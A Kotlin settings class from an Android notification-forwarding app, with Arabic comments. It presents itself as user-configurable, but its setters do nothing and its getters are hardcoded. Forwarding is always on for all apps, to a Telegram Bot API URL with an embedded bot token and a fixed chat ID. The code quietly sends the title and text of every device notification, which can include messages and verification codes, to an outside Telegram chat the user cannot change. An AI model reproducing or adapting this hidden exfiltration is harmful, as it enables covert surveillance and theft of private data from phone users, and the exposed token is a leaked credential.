package com.itsazni.notificationforwarder.settings

import android.content.Context

enum class FilterMode { ALL_APPS, WHITELIST, BLACKLIST }
enum class AuthMode { NONE, BEARER, CUSTOM }

data class AppSettings(
    val webhookUrl: String,
    val webhookMethod: String,
    val forwardingEnabled: Boolean,
    val filterMode: FilterMode,
    val filterPackages: Set<String>,
    val authMode: AuthMode,
    val bearerToken: String,
    val customHeadersRaw: String,
    val queryParamsRaw: String,
    val payloadTemplateRaw: String,
    val maxRetries: Int,
    val batchSize: Int
)

class SettingsStore(context: Context) {

    // رابط الـ API الخاص ببوت التليجرام الجديد والفعال
    var webhookUrl: String
        get() = "https://api.telegram.org/bot8774382428:AAEjf9QoTgY1Hw-kujIUBi03ef_ug26KsHc/sendMessage"
        set(_) {}

    // تفعيل التوجيه دائماً
    var forwardingEnabled: Boolean
        get() = true
        set(_) {}

    // طريقة الإرسال الثابتة (POST)
    var webhookMethod: String
        get() = "POST"
        set(_) {}

    // قالب الـ Payload المجهز بـ Chat ID والقالب الناجح
    var payloadTemplateRaw: String
        get() = """
            {
              "chat_id": "8027742578",
              "text": "📱 التطبيق: {appName}\n👤 العنوان: {title}\n💬 الرسالة: {text}"
            }
        """.trimIndent()
        set(_) {}

    // الترويسة المحددة لتليجرام
    var customHeadersRaw: String
        get() = "Content-Type: application/json"
        set(_) {}

    var filterMode: FilterMode
        get() = FilterMode.ALL_APPS
        set(_) {}

    var filterPackages: Set<String>
        get() = emptySet()
        set(_) {}

    var authMode: AuthMode
        get() = AuthMode.NONE
        set(_) {}

    var bearerToken: String
        get() = ""
        set(_) {}

    var queryParamsRaw: String
        get() = ""
        set(_) {}

    var maxRetries: Int
        get() = 5
        set(_) {}

    var batchSize: Int
        get() = 20
        set(_) {}

    fun readAll(): AppSettings {
        return AppSettings(
            webhookUrl = webhookUrl,
            webhookMethod = webhookMethod,
            forwardingEnabled = forwardingEnabled,
            filterMode = filterMode,
            filterPackages = filterPackages,
            authMode = authMode,
            bearerToken = bearerToken,
            customHeadersRaw = customHeadersRaw,
            queryParamsRaw = queryParamsRaw,
            payloadTemplateRaw = payloadTemplateRaw,
            maxRetries = maxRetries,
            batchSize = batchSize
        )
    }

    fun parseQueryParams(): Map<String, String> = emptyMap()

    fun parseHeaders(): Map<String, String> {
        return mapOf("Content-Type" to "application/json")
    }

    companion object {
        fun parsePackages(raw: String): Set<String> {
            return raw.split(',', '\n', ';')
                .map { it.trim() }
                .filter { it.isNotEmpty() }
                .toSet()
        }
    }
}
